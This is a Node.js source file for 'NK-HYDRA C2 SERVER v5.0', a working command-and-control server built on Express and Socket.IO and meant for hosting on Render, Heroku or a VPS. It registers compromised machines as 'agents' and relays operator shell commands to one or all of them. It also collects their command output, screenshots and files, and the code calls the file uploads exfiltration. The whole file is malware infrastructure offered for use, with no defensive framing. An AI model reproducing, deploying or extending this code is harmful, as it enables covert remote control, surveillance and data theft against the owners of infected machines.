
/**
 * NK-HYDRA C2 SERVER v5.0 (NODE.JS)
 * DEPLOYMENT: Render / Heroku / VPS
 * AUTHOR: NK (Neural Killer)
 */

const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

// Render requires reading from process.env.PORT
const PORT = process.env.PORT || 3000;

const server = http.createServer(app);

// Enable CORS for Socket.IO (Allow connection from any UI/Agent)
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  pingTimeout: 60000,
  pingInterval: 25000
});

// In-Memory Database (Use Redis/MongoDB for persistence in Prod)
let agents = {}; 
let uiClients = {};

io.on('connection', (socket) => {
  console.log('[+] Connection:', socket.id);

  // IDENTIFICATION HANDSHAKE
  socket.on('identify', (data) => {
    if (data.type === 'agent') {
      agents[socket.id] = {
        socketId: socket.id,
        id: data.id || socket.id,
        os: data.os || 'Unknown',
        hostname: data.hostname || 'Unknown',
        ip: socket.handshake.address,
        status: 'Online',
        lastSeen: Date.now()
      };
      console.log(`[+] Agent Registered: ${agents[socket.id].id}`);
      broadcastAgentList();
    } else if (data.type === 'ui') {
      uiClients[socket.id] = true;
      console.log('[+] UI Console Connected');
      // Send current list immediately
      socket.emit('agents_list', Object.values(agents));
    }
  });

  // COMMAND RELAY (UI -> SERVER -> AGENT)
  socket.on('cmd', (data) => {
    // data = { target: 'agent_id' | 'all', cmd: 'whoami' }
    const command = data.cmd;
    const target = data.target;

    console.log(`[CMD] ${command} -> ${target}`);

    if (target === 'all') {
      io.emit('exec', { cmd: command }); // Broadcast to everyone
    } else {
      // Find specific socket
      const agentSocketId = Object.keys(agents).find(sid => agents[sid].id === target);
      if (agentSocketId) {
        io.to(agentSocketId).emit('exec', { cmd: command });
      }
    }
  });

  // LOGS FROM AGENTS
  socket.on('stream_log', (data) => {
    // Relay to UI
    // data = { from: 'agent_id', output: '...' }
    io.emit('agent_event', {
      type: 'SHELL_OUTPUT',
      agentId: data.from,
      payload: data.output,
      timestamp: Date.now()
    });
  });

  // SCREENSHOTS FROM AGENTS
  socket.on('screenshot', (data) => {
    // data = { from: 'agent_id', b64: '...' }
    io.emit('agent_event', {
      type: 'SCREENSHOT',
      agentId: data.from,
      payload: data.b64, // Base64 image string
      timestamp: Date.now()
    });
  });

  // FILE UPLOAD (EXFILTRATION)
  socket.on('upload_file', (data) => {
    console.log(`[+] File Received from ${data.from}: ${data.filename}`);
    // Ideally save to S3 or Disk. For now, relay to UI log.
    io.emit('log', `File Exfiltrated: ${data.filename} (${data.b64content.length} bytes)`);
  });

  // HEARTBEAT
  socket.on('heartbeat', (data) => {
    if (agents[socket.id]) {
      agents[socket.id].lastSeen = Date.now();
      agents[socket.id].status = 'Online';
      // Broadcast updates occasionally or on status change
    }
  });

  socket.on('disconnect', () => {
    if (agents[socket.id]) {
      console.log(`[-] Agent Disconnected: ${agents[socket.id].id}`);
      delete agents[socket.id];
      broadcastAgentList();
    }
    if (uiClients[socket.id]) {
        delete uiClients[socket.id];
    }
  });
});

function broadcastAgentList() {
  io.emit('agents_list', Object.values(agents));
}

app.get('/', (req, res) => {
  res.send(`Hydra C2 v5.0 Online. Agents: ${Object.keys(agents).length}`);
});

server.listen(PORT, () => {
  console.log(`[+] Hydra C2 listening on port ${PORT}`);
});
